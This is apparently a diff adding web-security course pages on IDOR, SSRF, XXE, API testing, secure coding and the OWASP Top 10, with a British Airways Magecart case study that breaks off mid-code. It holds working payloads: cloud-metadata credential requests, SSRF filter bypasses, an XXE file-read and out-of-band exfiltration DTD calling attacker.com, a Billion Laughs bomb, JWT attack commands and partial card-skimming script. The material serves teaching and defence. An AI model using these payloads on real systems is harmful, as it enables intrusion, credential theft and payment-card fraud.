+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>IDOR exposes internal object IDs (user IDs, order IDs, file names) in URLs or parameters — any user can access any other object by changing the ID, bypassing authorization entirely.</div>
+    <div class="sub"><h3>IDOR Deep Dive</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">IDOR ATTACKS — TYPES + TESTING</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ TYPE 1: URL PARAMETER IDOR ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Legitimate request:</span>
+<span class="fl">GET /api/orders/1001</span>           <span class="cm"># Your order</span>
+<span class="cm"># IDOR attack:</span>
+<span class="err">GET /api/orders/1002</span>           <span class="cm"># Another user's order — no auth check!</span>
+<span class="err">GET /api/orders/1000</span>           <span class="cm"># Admin order? Even older?</span>
+<span class="cm"># Enumerate: /orders/1, /orders/2, /orders/3... → all users' data!</span>
+
+<span class="cm">━━━ TYPE 2: FILE DOWNLOAD IDOR ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="err">GET /download?file=invoice_1001.pdf</span>   <span class="cm"># Your invoice</span>
+<span class="err">GET /download?file=invoice_1002.pdf</span>   <span class="cm"># Other customer's invoice!</span>
+<span class="err">GET /download?file=../../../etc/passwd</span> <span class="cm"># Path traversal too!</span>
+
+<span class="cm">━━━ TYPE 3: POST BODY IDOR ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="fl">POST /api/profile/update
+{"user_id": 1001, "email": "alice@example.com"}</span>
+
+<span class="cm"># IDOR: Change user_id to another user's ID:</span>
+<span class="err">POST /api/profile/update
+{"user_id": 1002, "email": "hacked@evil.com"}   ← Changes admin's email!</span>
+
+<span class="cm">━━━ TYPE 4: ENCODED/HASHED IDOR ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Some apps encode or hash the ID — still IDOR if predictable:</span>
+<span class="fl">/invoice/aWQ9MTAwMQ==</span>         <span class="cm"># base64(id=1001) → decode → change → re-encode</span>
+<span class="fl">/invoice/c4ca4238a0b923820dcc509a6f75849b</span>  <span class="cm"># MD5("1001") → predictable!</span>
+
+<span class="cm">━━━ TESTING IDOR WITH BURP SUITE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># 1. Map all endpoints that reference objects by ID</span>
+<span class="cm"># 2. Log in as User A, capture all requests</span>
+<span class="cm"># 3. Log in as User B in different browser</span>
+<span class="cm"># 4. Replay User A's requests in Burp Repeater using User B's session</span>
+<span class="cm"># 5. If User B can access User A's objects → IDOR confirmed!</span>
+<span class="cm"># Burp Intruder: fuzz numeric IDs: 1-9999 → see which return 200</span>
+
+<span class="cm">━━━ REAL-WORLD IDOR BUGS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="out">2019 Venmo: Exposed all transactions of all users via API pagination
+2021 Instagram: IDOR in Stories API → see anyone's private stories
+2022 Shopify: IDOR in Partner API → access any store's order data
+Bounties: IDOR on critical endpoints = $1,000–$50,000+ on bug bounty</span></pre></div>
+      </div>
+    </div>
+    <div class="ad-grid">
+      <div class="atk-box"><h4>⚔️ IDOR Impact</h4><ul>
+        <li>Read other users' private data</li>
+        <li>Modify/delete other users' records</li>
+        <li>Access admin functions as regular user</li>
+        <li>Mass data enumeration (iterate all IDs)</li>
+        <li>Access confidential files/documents</li>
+      </ul></div>
+      <div class="def-box"><h4>🛡️ IDOR Defences</h4><ul>
+        <li>Server-side authorisation check on EVERY request</li>
+        <li>Validate: "Does user X own object Y?"</li>
+        <li>Use indirect references (UUIDs, not sequential IDs)</li>
+        <li>Map user's objects in server session (not in URL)</li>
+        <li>Implement proper RBAC (Role-Based Access Control)</li>
+      </ul></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Log into any web app and change the user ID in a URL by ±1. What happens? Do you see another user's data?</li>
+      <li>Why is using UUID (e.g., <code>550e8400-e29b-41d4-a716-446655440000</code>) instead of sequential integers a partial — but not complete — defence against IDOR?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>IDOR is one of the most common and impactful vulnerabilities found in bug bounties. The fix is always the same: every access to an object must check that the requesting user owns or is authorised to access that specific object. Never trust client-supplied IDs alone — always validate ownership server-side.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T120 ===== -->
+<div class="sec" id="t120">
+  <div class="sh"><span class="sn">Topic 120 🔥</span><h2>SSRF — Server-Side Request Forgery</h2><span class="badge b-r">CRITICAL</span><span class="se">🌀</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>SSRF tricks the server into making HTTP requests to internal services — allowing attackers to reach cloud metadata APIs, internal databases, and admin panels that should never be publicly accessible.</div>
+    <div class="sub"><h3>SSRF Deep Dive</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">SSRF — ATTACK + EXPLOITATION</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ BASIC SSRF ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Vulnerable feature: "Load image from URL"</span>
+<span class="cm"># Server fetches URL server-side and returns content</span>
+<span class="fl">POST /fetch-image
+{"url": "https://example.com/img.jpg"}  ← Legitimate</span>
+
+<span class="cm"># SSRF: point to internal services:</span>
+<span class="err">{"url": "http://localhost/admin"}</span>         <span class="cm"># Access local admin panel</span>
+<span class="err">{"url": "http://192.168.1.1/admin"}</span>       <span class="cm"># Access router admin</span>
+<span class="err">{"url": "http://internal-db:5432"}</span>        <span class="cm"># Port scan internal network</span>
+
+<span class="cm">━━━ CLOUD METADATA SSRF (Critical!) ━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># AWS EC2 metadata endpoint (accessible from inside cloud server):</span>
+<span class="err">{"url": "http://169.254.169.254/latest/meta-data/"}</span>
+<span class="out">ami-id
+hostname
+instance-type
+iam/</span>
+
+<span class="cm"># Get IAM credentials (AWS access keys!):</span>
+<span class="err">{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}</span>
+<span class="out">{
+  "AccessKeyId": "ASIAXXXXXXXXXXX",
+  "SecretAccessKey": "XXXXXXXXXXXXXXXXXXXXX",
+  "Token": "XXXXXXXXXX"
+}</span>
+<span class="cm"># Attacker now has AWS credentials → full cloud compromise!</span>
+<span class="cm"># Capital One 2019 breach: SSRF → AWS metadata → 100M records stolen</span>
+
+<span class="cm">━━━ SSRF BYPASS TECHNIQUES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Blocklist bypass (if "localhost" is blocked):</span>
+<span class="fl">http://127.0.0.1          # IPv4 loopback</span>
+<span class="fl">http://[::1]              # IPv6 loopback</span>
+<span class="fl">http://2130706433         # Decimal notation for 127.0.0.1</span>
+<span class="fl">http://0x7f000001         # Hex notation for 127.0.0.1</span>
+<span class="fl">http://127.1              # Short form</span>
+<span class="fl">http://attacker.com</span>       <span class="cm"># attacker.com DNS resolves to 127.0.0.1 (DNS rebinding)</span>
+
+<span class="cm"># Protocol bypass:</span>
+<span class="fl">file:///etc/passwd        # File protocol (read local files)</span>
+<span class="fl">dict://localhost:6379/    # Redis command injection via dict protocol</span>
+<span class="fl">gopher://localhost:25/    # SMTP relay via gopher (send emails as server)</span>
+
+<span class="cm">━━━ TESTING SSRF ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Use Burp Collaborator (generates unique URLs that log DNS/HTTP hits):</span>
+<span class="fl">{"url": "http://YOUR_COLLABORATOR_ID.oastify.com"}</span>
+<span class="cm"># If server makes request → SSRF confirmed (out-of-band detection)</span>
+
+<span class="cm"># Test all URL-accepting parameters:
+# webhooks, image URLs, document import, PDF generators, XML imports</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>The Capital One breach (2019) used SSRF to access AWS metadata. Explain the full attack chain from SSRF to 100 million records exposed.</li>
+      <li>Why is blocking "localhost" and "127.0.0.1" insufficient SSRF defence? List 5 bypass techniques.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>SSRF became critical with the rise of cloud computing — cloud metadata endpoints expose credentials that grant full cloud account access. Defence requires a strict allowlist (only specific external domains), blocking private IP ranges at the egress firewall, and using IMDSv2 (which requires a token for AWS metadata access).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T121 ===== -->
+<div class="sec" id="t121">
+  <div class="sh"><span class="sn">Topic 121 🔥</span><h2>XXE — XML External Entity Attack</h2><span class="badge b-r">HIGH</span><span class="se">📋</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>XXE exploits XML parsers that process external entity definitions — allowing attackers to read local files, perform SSRF, cause DoS (Billion Laughs), or achieve RCE via blind XXE.</div>
+    <div class="sub"><h3>XXE Attack</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">XXE — ATTACK TYPES + PAYLOADS</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ BASIC XXE — Read Local Files ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Normal XML request:</span>
+<span class="fl">&lt;?xml version="1.0"?&gt;
+&lt;user&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;/user&gt;</span>
+
+<span class="cm"># XXE payload — reads /etc/passwd:</span>
+<span class="cr">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</span>
+
+<span class="cm"># Response shows file contents in &lt;name&gt; field:
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...</span>
+
+<span class="cm">━━━ XXE — SSRF via External Entity ━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cr">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/"&gt;
+]&gt;</span>
+<span class="cm"># Reads AWS metadata through XXE SSRF</span>
+
+<span class="cm">━━━ BLIND XXE — Out-of-Band Exfiltration ━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cr">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd"&gt;
+  %dtd;
+]&gt;</span>
+<span class="cm"># malicious.dtd hosted on attacker's server:
+# &lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?f=%file;'&gt;"&gt;
+# %eval; %exfil;
+# File contents arrive at attacker's server via HTTP request parameter!</span>
+
+<span class="cm">━━━ Billion Laughs DoS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cr">&lt;!DOCTYPE bomb [
+  &lt;!ENTITY a "LOL"&gt;
+  &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
+  &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;
+  ...
+]&gt;
+&lt;data&gt;&amp;d;&lt;/data&gt;</span>
+<span class="cm"># Entity expands exponentially → 3GB of memory from 1KB input → DoS!</span>
+
+<span class="cm"># Defence: Disable external entities in XML parser:</span>
+<span class="cg"># Java (DocumentBuilderFactory):</span>
+<span class="cg">dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</span>
+<span class="cg"># Python (lxml):</span>
+<span class="cg">parser = etree.XMLParser(resolve_entities=False, no_network=True)</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Create a simple XML file with an XXE payload that reads <code>/etc/hostname</code>. Use an online XML parser to test what happens with and without external entity processing enabled.</li>
+      <li>A developer says "We use JSON, not XML, so we're safe from XXE." Is this always true? What if they also accept XML or use XML internally?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>XXE stems from dangerous XML parser default settings. The fix is simple: disable DOCTYPE declarations and external entity processing in your XML parser configuration — usually a single line of code. Check ALL places your application processes XML, including SOAP APIs, document imports, and RSS feeds.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T122 ===== -->
+<div class="sec" id="t122">
+  <div class="sh"><span class="sn">Topic 122 🔥</span><h2>API Security</h2><span class="badge b-r">CRITICAL</span><span class="se">🔌</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>APIs expose business logic directly and are prime targets — common flaws include broken authentication, mass assignment, excessive data exposure, rate limiting absence, and lack of encryption.</div>
+    <div class="sub"><h3>OWASP API Security Top 10</h3>
+      <div class="tw"><table>
+        <thead><tr><th>#</th><th>Vulnerability</th><th>Example Attack</th><th>Fix</th></tr></thead>
+        <tbody>
+          <tr><td>API1</td><td>Broken Object Level Auth</td><td>Change <code>userId</code> in request to access other users (IDOR)</td><td>Validate ownership on every request</td></tr>
+          <tr><td>API2</td><td>Broken Authentication</td><td>No rate limiting on login → brute force</td><td>MFA, rate limiting, lockout</td></tr>
+          <tr><td>API3</td><td>Broken Object Property Auth</td><td>Mass assignment: <code>{"role":"admin"}</code> in profile update</td><td>Allowlist accepted properties</td></tr>
+          <tr><td>API4</td><td>Unrestricted Resource Consumption</td><td>No rate limit → 1 billion GraphQL queries = DoS</td><td>Rate limiting, pagination, timeouts</td></tr>
+          <tr><td>API5</td><td>Broken Function Level Auth</td><td>Call <code>DELETE /admin/users/1</code> as regular user</td><td>RBAC on every endpoint</td></tr>
+          <tr><td>API6</td><td>Unrestricted Access to Sensitive Flows</td><td>Skip payment step by calling order fulfillment API directly</td><td>Server-side business logic enforcement</td></tr>
+          <tr><td>API7</td><td>Server-Side Request Forgery</td><td>webhook URL → internal service</td><td>Allowlist outbound targets</td></tr>
+          <tr><td>API8</td><td>Security Misconfiguration</td><td>Debug mode on → stack traces in responses</td><td>Harden, remove debug info from production</td></tr>
+          <tr><td>API9</td><td>Improper Inventory Management</td><td>Old API v1 still accessible, no auth</td><td>API versioning + deprecation + discovery</td></tr>
+          <tr><td>API10</td><td>Unsafe Consumption of APIs</td><td>Trust third-party API data, process without sanitisation → SQLi</td><td>Treat external API data as untrusted input</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>API Testing with Kali</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">API SECURITY TESTING COMMANDS</div></div>
+        <div class="term-body"><pre><span class="cm"># ── API recon: find all endpoints ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ffuf -u https://api.target.com/FUZZ -w /usr/share/wordlists/api_wordlist.txt</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">gobuster dir -u https://api.target.com -w /usr/share/wordlists/dirb/common.txt -x json,php</span>
+
+<span class="cm"># ── Check for exposed API docs (Swagger/OpenAPI) ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl https://api.target.com/swagger.json</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl https://api.target.com/api-docs</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl https://api.target.com/openapi.yaml</span>
+
+<span class="cm"># ── Mass assignment attack ──</span>
+<span class="cm"># Legitimate update:</span>
+<span class="fl">curl -X PUT https://api.target.com/user/profile \
+  -H "Authorization: Bearer TOKEN" \
+  -d '{"name":"Alice","email":"alice@test.com"}'</span>
+<span class="cm"># Mass assignment attack (add extra fields):</span>
+<span class="err">curl -X PUT https://api.target.com/user/profile \
+  -H "Authorization: Bearer TOKEN" \
+  -d '{"name":"Alice","email":"alice@test.com","role":"admin","is_admin":true}'</span>
+<span class="cm"># If server accepts all fields → role escalated!</span>
+
+<span class="cm"># ── JWT manipulation ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicmVsZSI6InVzZXIifQ.xxx" | \
+  base64 -d 2>/dev/null</span>
+<span class="out">{"alg":"HS256","typ":"JWT"}{"sub":"1234","role":"user"}</span>
+
+<span class="cm"># Algorithm confusion attack (change HS256 to none):</span>
+<span class="cm"># Tools: jwt_tool, jwt-cracker, Burp JWT Editor extension</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">python3 jwt_tool.py TOKEN -X a</span>  <span class="cm"># alg=none attack</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt</span>  <span class="cm"># Crack JWT secret</span>
+
+<span class="cm"># ── GraphQL introspection (discover all queries/mutations) ──</span>
+<span class="fl">POST /graphql
+{"query": "{__schema{queryType{fields{name,description}}}}"}</span>
+<span class="cm"># Returns all available operations → map entire API!</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>What is a "mass assignment" vulnerability? Give a code example in any language showing a vulnerable endpoint and the fix.</li>
+      <li>Decode a JWT token (use jwt.io). What three parts does it have? What happens if you change the payload and remove the signature?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>APIs are the backbone of modern web applications — and increasingly the primary attack target. The OWASP API Security Top 10 identifies patterns that appear in nearly every API breach. Rate limit everything, validate all permissions server-side, use proper JWT validation, and never expose internal object IDs directly.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T123 ===== -->
+<div class="sgt">🔐 Defences &amp; Best Practices</div>
+<div class="sec" id="t123">
+  <div class="sh"><span class="sn">Topic 123</span><h2>Secure Coding Practices</h2><span class="se">💻</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Security must be built into code from the start — input validation, output encoding, parameterised queries, least privilege, error handling, and dependency management eliminate the majority of vulnerabilities.</div>
+    <div class="sub"><h3>The Core Secure Coding Rules</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Rule</th><th>What It Means</th><th>Violation → Attack</th><th>Code Pattern</th></tr></thead>
+        <tbody>
+          <tr><td>Validate ALL input</td><td>Every piece of user data: type, length, format, range</td><td>SQLi, XSS, buffer overflow</td><td>Allowlist validation on backend</td></tr>
+          <tr><td>Encode ALL output</td><td>Context-aware encoding before rendering user data</td><td>XSS in HTML, JS, CSS, URL contexts</td><td>htmlspecialchars(), DOMPurify</td></tr>
+          <tr><td>Parameterise queries</td><td>Never concatenate SQL with user input</td><td>SQL injection</td><td>Prepared statements</td></tr>
+          <tr><td>Least privilege</td><td>Code runs with minimum needed permissions</td><td>Full DB dump if SQLi found</td><td>DB user only has SELECT on needed tables</td></tr>
+          <tr><td>Fail securely</td><td>Errors reveal no sensitive info; deny access on failure</td><td>Info disclosure, auth bypass</td><td>Generic error messages; log details server-side</td></tr>
+          <tr><td>Defence in depth</td><td>Multiple layers — code + WAF + DB + network</td><td>Single control bypass = full compromise</td><td>Layer security controls</td></tr>
+          <tr><td>Keep dependencies updated</td><td>Third-party libs have their own vulnerabilities</td><td>Log4Shell — library vulnerability</td><td>npm audit, pip audit, Dependabot</td></tr>
+          <tr><td>Store secrets securely</td><td>No passwords/keys in code or version control</td><td>Source code leak = credential theft</td><td>Environment vars, secrets managers</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Code Security Examples</h3>
+      <div class="cb"><div class="clbl">SECURE CODING PATTERNS</div><pre><span class="cm">━━━ INPUT VALIDATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Python — allowlist validation:</span>
+<span class="cr">username = request.form['username']  # BAD: no validation</span>
+<span class="cg">import re
+username = request.form['username']
+if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
+    return "Invalid username", 400  # Allowlist: only alphanumeric + underscore</span>
+
+<span class="cm">━━━ OUTPUT ENCODING ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># PHP — always encode before HTML output:</span>
+<span class="cr">echo "Hello " . $_GET['name'];  // BAD: XSS possible</span>
+<span class="cg">echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');  // GOOD</span>
+
+<span class="cm"># JavaScript — use textContent, NOT innerHTML:</span>
+<span class="cr">document.getElementById('msg').innerHTML = userInput;  // BAD: XSS!</span>
+<span class="cg">document.getElementById('msg').textContent = userInput;  // GOOD: treated as text</span>
+
+<span class="cm">━━━ ERROR HANDLING ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># BAD — leaks sensitive info to user:</span>
+<span class="cr">except Exception as e:
+    return jsonify({"error": str(e)})  # May show: SQL error, stack trace, file path</span>
+
+<span class="cm"># GOOD — generic message to user, full detail to logs:</span>
+<span class="cg">except Exception as e:
+    app.logger.error(f"Error in /api/users: {e}", exc_info=True)  # Log full detail
+    return jsonify({"error": "An internal error occurred"}), 500   # Generic to user</span>
+
+<span class="cm">━━━ DEPENDENCY SECURITY ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">npm audit</span>              <span class="cm"># Node.js: find vulnerable packages</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">pip audit</span>              <span class="cm"># Python: scan for CVEs in requirements</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">snyk test</span>              <span class="cm"># Multi-language vulnerability scanning</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">trivy fs .</span>             <span class="cm"># Scan repo + docker image for CVEs</span></pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Review this code: <code>query = "SELECT * FROM users WHERE id=" + user_id</code>. List all security problems and rewrite it securely.</li>
+      <li>Run <code>npm audit</code> in a Node.js project. Find a HIGH or CRITICAL vulnerability. Look up the CVE number — what does it allow an attacker to do?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Secure coding is not about complex defensive magic — it's about consistently applying simple rules: validate input, encode output, parameterise queries, handle errors safely, keep dependencies updated. Security tools (SAST scanners, dependency auditors) automate finding violations. The goal is security by default in every code change.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T124 ===== -->
+<div class="sec" id="t124">
+  <div class="sh"><span class="sn">Topic 124</span><h2>OWASP Top 10</h2><span class="se">📊</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>The OWASP Top 10 is the globally recognised list of the most critical web application security risks — the industry standard for web security awareness and testing checklists.</div>
+    <div class="sub"><h3>OWASP Top 10 (2021 Edition)</h3>
+      <div class="owasp-grid">
+        <div class="ow-card"><div class="ow-rank">A01:2021</div><div class="ow-name">Broken Access Control</div><div class="ow-desc">↑ from #5 to #1. IDOR, force browsing, privilege escalation, CORS misconfiguration. Found in 94% of apps tested.</div></div>
+        <div class="ow-card"><div class="ow-rank">A02:2021</div><div class="ow-name">Cryptographic Failures</div><div class="ow-desc">Formerly "Sensitive Data Exposure". Weak encryption, HTTP instead of HTTPS, storing passwords in plaintext, weak hashing (MD5).</div></div>
+        <div class="ow-card"><div class="ow-rank">A03:2021</div><div class="ow-name">Injection</div><div class="ow-desc">↓ from #1 to #3. SQL, NoSQL, LDAP, OS command, SSTI injection. Parameterised queries prevent SQL injection.</div></div>
+        <div class="ow-card"><div class="ow-rank">A04:2021</div><div class="ow-name">Insecure Design</div><div class="ow-desc">NEW. Security flaws in architecture/design phase — not just implementation bugs. Requires threat modelling.</div></div>
+        <div class="ow-card"><div class="ow-rank">A05:2021</div><div class="ow-name">Security Misconfiguration</div><div class="ow-desc">Default passwords, open cloud storage, unnecessary services, verbose error messages, missing security headers.</div></div>
+        <div class="ow-card"><div class="ow-rank">A06:2021</div><div class="ow-name">Vulnerable Components</div><div class="ow-desc">Using libraries/frameworks with known CVEs. Log4Shell affected millions. Use <code>npm audit</code>, <code>pip audit</code>, SCA tools.</div></div>
+        <div class="ow-card"><div class="ow-rank">A07:2021</div><div class="ow-name">Auth Failures</div><div class="ow-desc">Weak passwords, no MFA, broken session management, credential stuffing, missing brute force protection.</div></div>
+        <div class="ow-card"><div class="ow-rank">A08:2021</div><div class="ow-name">Software &amp; Data Integrity</div><div class="ow-desc">NEW. Insecure CI/CD, deserialization of untrusted data, unsigned software updates. SolarWinds is an example.</div></div>
+        <div class="ow-card"><div class="ow-rank">A09:2021</div><div class="ow-name">Logging &amp; Monitoring Failures</div><div class="ow-desc">No audit logs, attacks go undetected, no alerting. Average breach dwell time: 21 days. You can't detect what you don't log.</div></div>
+        <div class="ow-card"><div class="ow-rank">A10:2021</div><div class="ow-name">SSRF</div><div class="ow-desc">NEW. Tricked server fetches internal resources. Cloud metadata exploitation (AWS IMDSv1). Capital One breach.</div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Testing Each OWASP Top 10 — Kali</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">OWASP TOP 10 TESTING CHECKLIST</div></div>
+        <div class="term-body"><pre><span class="fl">A01 Access Control:</span>     <span class="cg">Burp Suite Repeater: swap user IDs, try admin paths</span>
+<span class="fl">A02 Crypto Failures:</span>    <span class="cg">sslyze target:443 | testssl.sh target</span>
+<span class="fl">A03 Injection:</span>          <span class="cg">sqlmap -u URL --dbs | commix -u URL | tplmap (SSTI)</span>
+<span class="fl">A04 Insecure Design:</span>    <span class="cg">Manual: threat model, business logic testing</span>
+<span class="fl">A05 Misconfiguration:</span>   <span class="cg">nikto -h target | nuclei -u target -t misconfiguration</span>
+<span class="fl">A06 Vuln Components:</span>    <span class="cg">retire.js | npm audit | snyk test</span>
+<span class="fl">A07 Auth Failures:</span>      <span class="cg">hydra, medusa | Burp Intruder for brute force</span>
+<span class="fl">A08 Integrity:</span>          <span class="cg">ysoserial (deserialization) | check update mechanism</span>
+<span class="fl">A09 Logging:</span>            <span class="cg">Perform attacks → check if alerts fired in SIEM</span>
+<span class="fl">A10 SSRF:</span>               <span class="cg">Burp Collaborator | ffuf on URL params</span>
+
+<span class="cm"># ── Nuclei — automated vulnerability scanner ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei -u https://target.com -t owasp-top-10</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei -u https://target.com -severity critical,high</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei -l targets.txt -t cves/</span>  <span class="cm"># Scan list of targets for known CVEs</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>For each OWASP Top 10 entry, identify one specific vulnerability from this unit that falls under it.</li>
+      <li>Why did Broken Access Control move from #5 to #1 in 2021? What change in web architecture made this more prevalent?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>The OWASP Top 10 is not just a list — it's a risk framework, testing checklist, and development guide. Every web security professional must know it by heart. The 2021 update added three new categories (Insecure Design, Software Integrity, SSRF), reflecting how cloud and API-first development changed the threat landscape.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T125 ===== -->
+<div class="sec" id="t125">
+  <div class="sh"><span class="sn">Topic 125</span><h2>Case Study: British Airways Breach 2018</h2><span class="se">✈️</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Attackers injected 22 lines of malicious JavaScript into British Airways' booking page — a Magecart supply chain XSS attack that skimmed 500,000 customers' payment card details in real-time for 15 days.</div>
+    <div class="sub"><h3>The Magecart Attack on British Airways</h3>
+      <div class="cb"><div class="clbl">BA BREACH 2018 — ATTACK CHAIN</div><pre><span class="cy">Timeline:</span> Aug 21 – Sep 5, 2018 (15 days)
+<span class="cy">Victims:</span>  500,000 customers' card details + personal data
+<span class="cy">GDPR Fine:</span> £183 million (later reduced to £20 million)
+<span class="cy">Attack:</span>   Magecart supply chain JavaScript injection
+
+<span class="cr">STEP 1: Initial Compromise</span>
+  → Attackers compromised third-party script hosted by BA
+  → Specifically: a Modernizr library loaded by ba.com
+  → (Exact entry point still debated — likely insider or supplier compromise)
+
+<span class="cr">STEP 2: Script Injection</span>
+  → Attackers injected 22 lines of malicious JS into the payment script
+  → Only active on /make-payment page (stealth!)
+
+<span class="cr">STEP 3: The Malicious Code</span>
+<span class="err">// Injected Magecart JavaScript (simplified):
+var formData = {
+  name: document.querySelector('[name=name]').value,
+  cardNumber: document.querySelector('[name=cardnumber]').value,
+  cvv: document.querySelector('[name=cvv2]').value,
